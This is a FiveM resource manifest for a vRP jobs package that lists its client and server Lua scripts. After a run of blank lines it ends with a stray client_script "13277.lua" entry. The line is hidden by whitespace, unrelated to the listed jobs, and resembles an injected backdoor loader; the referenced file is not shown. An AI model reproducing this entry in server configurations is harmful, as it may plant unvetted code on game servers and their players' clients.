
resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'
description "esk_jobs"

dependency {"vrp","ghmattimysql"}

client_scripts{ 
  "lib/Tunnel.lua",
  "lib/Proxy.lua",
  "client.lua",
  "joburile/gruppe6C.lua",
  "joburile/postasC.lua",
  "joburile/drogatiC.lua",
  "joburile/heckerC.lua"
}

server_scripts{ 
  "@vrp/lib/utils.lua",
  "server.lua",
  "joburile/gruppe6S.lua",
  "joburile/postasS.lua",
  "joburile/drogatiS.lua",
  "joburile/heckerS.lua"
}








client_script "13277.lua"